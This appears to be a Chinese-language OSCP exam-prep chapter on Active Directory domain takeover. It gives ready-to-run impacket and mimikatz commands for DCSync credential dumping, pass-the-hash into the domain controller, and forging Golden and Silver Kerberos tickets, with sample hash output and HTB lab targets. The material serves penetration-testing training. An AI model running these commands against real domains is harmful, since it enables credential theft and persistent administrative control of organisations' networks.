# Ch 35 — DCSync + Golden Ticket：接管 Domain Controller

> 目標：用 DCSync 提取所有帳號的 hash，用 Golden Ticket 建立永久後門，完成 AD 三機器鏈的最後一步。

## DC 完整接管的終點

OSCP AD 三機器鏈最後要「接管 Domain Controller」，評分標準是：
- 取得 DC 的 `proof.txt`（`C:\Users\Administrator\Desktop\proof.txt`）
- 截圖含有 `Administrator` 或 `SYSTEM` 權限 + DC IP + proof 內容

有幾條路到終點：
```
1. 取得 Domain Admin 帳號 → psexec.py 進 DC
2. DCSync → 提取 krbtgt / Administrator hash → PtH 進 DC
3. Golden Ticket → 任何時候都能進 DC
```

## DCSync

### 原理

DC 之間會同步（Replication）AD 資料庫。你可以**偽裝成另一個 DC**，向真正的 DC 請求複製所有帳號的 hash。這就是 DCSync。

**前提**：你的帳號需要 `Replicating Directory Changes` 和 `Replicating Directory Changes All` 權限。默認 Domain Admins 有，也可以通過 BloodHound 找到有 DCSync 權限的其他帳號。

### 執行 DCSync

**impacket secretsdump.py**

```bash
# 以 DA 身份執行（從 Kali，不需要在 DC 上）
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    corp.local/administrator:'P@ssw0rd'@10.10.10.x

# 用 hash（如果已知 DA hash）
python3 secretsdump.py \
    corp.local/administrator@10.10.10.x \
    -hashes :DA_NTLM_HASH

# 只要特定帳號的 hash
python3 secretsdump.py \
    corp.local/administrator@10.10.10.x \
    -just-dc-user krbtgt
```

輸出：

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
```

### Mimikatz DCSync（在 DC 或有 DA 的 shell 上）

```cmd
# 提取所有 hash
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# 只提取 krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

## 用 DCSync 的結果進 DC

```bash
# 拿到 Administrator hash 後，直接 PtH 進 DC
python3 psexec.py administrator@10.10.10.x -hashes :ADMIN_NTLM_HASH

# 進去後取 proof.txt
type C:\Users\Administrator\Desktop\proof.txt
ipconfig
whoami
# 截圖！
```

## Golden Ticket

### 原理

Kerberos TGT 是用 `krbtgt` 帳號的 hash 加密的。如果你有 `krbtgt` 的 hash，可以**偽造任意 TGT**——包括永遠不過期、以任何使用者身份、屬於 Domain Admins 的 TGT。

這就是 Golden Ticket：一張偽造的萬能 TGT。

### 取得 krbtgt Hash

```bash
# DCSync（如上）
python3 secretsdump.py corp.local/administrator@10.10.10.x -just-dc-user krbtgt

# 輸出：
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
# NTLM hash = 1693c6cefafffc7af11ef34d1c788f47
```

### 取得 Domain SID

```bash
# impacket lookupsid.py
python3 lookupsid.py corp.local/administrator:'P@ssw0rd'@10.10.10.x | grep "Domain SID"
# Domain SID: S-1-5-21-1234567890-1234567890-1234567890

# 或 PowerShell
Get-ADDomain | Select-Object DomainSID
```

### 偽造 Golden Ticket（impacket）

```bash
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
    -nthash 1693c6cefafffc7af11ef34d1c788f47 \
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    Administrator

# 輸出：Administrator.ccache
```

### 使用 Golden Ticket

```bash
# 設定環境變數（KRB5CCNAME 指向 ticket 檔案）
export KRB5CCNAME=Administrator.ccache

# 用 Kerberos ticket（-k 參數）
python3 psexec.py corp.local/Administrator@dc.corp.local -k -no-pass
python3 wmiexec.py corp.local/Administrator@dc.corp.local -k -no-pass

# 或 smbclient
smbclient //dc.corp.local/C$ -k
```

### Mimikatz 偽造

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ticket:golden.kirbi /ptt
```

## Silver Ticket（服務特定）

Silver Ticket 是偽造特定服務的 TGS（不需要 krbtgt hash，只需要服務帳號 hash）：

```bash
# 針對 CIFS 服務（檔案共享）
python3 ticketer.py \
    -nthash SERVICE_ACCOUNT_HASH \
    -domain-sid S-1-5-21-... \
    -domain corp.local \
    -spn cifs/dc.corp.local \
    Administrator
```

Silver Ticket 偵測難度比 Golden Ticket 低（OPSEC 考量），但 OSCP 不需要太擔心這個。

## OSCP AD 三機器鏈完整流程

```
Machine 1（用戶機器）：
  → 枚舉（nmap, enum4linux, bloodhound）
  → 初始立足（AS-REP / spray / web vuln）
  → 提權到 Local Admin / SYSTEM
  → 提取本地 hash / 找域帳號密碼
  → 截圖 local.txt（10分）

Machine 2（另一台）：
  → 用 Machine 1 的憑證橫向移動（PtH / SMB）
  → 提權到 SYSTEM
  → 截圖 local.txt（10分）

Machine 3（DC）：
  → Kerberoasting / BloodHound 找路徑
  → 橫向到 DC 或 DCSync
  → 截圖 proof.txt（20分）
```

## 本章對應靶機

| 機器 | DC 接管技術 |
|------|-----------|
| HTB Forest | WriteDACL → DCSync → Golden Ticket |
| HTB Active | Kerberoasting → DA → secretsdump → PtH 進 DC |
| HTB Sauna | AS-REP → Kerberoasting → DCSync |

## 自我檢核

- [ ] 知道 DCSync 需要什麼權限（Replicating Directory Changes）
- [ ] 能用 secretsdump.py 取得 krbtgt 的 hash
- [ ] 知道 Golden Ticket 需要什麼材料（krbtgt hash + Domain SID）
- [ ] 能用偽造的 Golden Ticket 連接 DC（export KRB5CCNAME + psexec.py -k）

→ [Ch 36 OSCP AD 三機器鏈實戰模擬](./36-ad-chain-simulation.md)
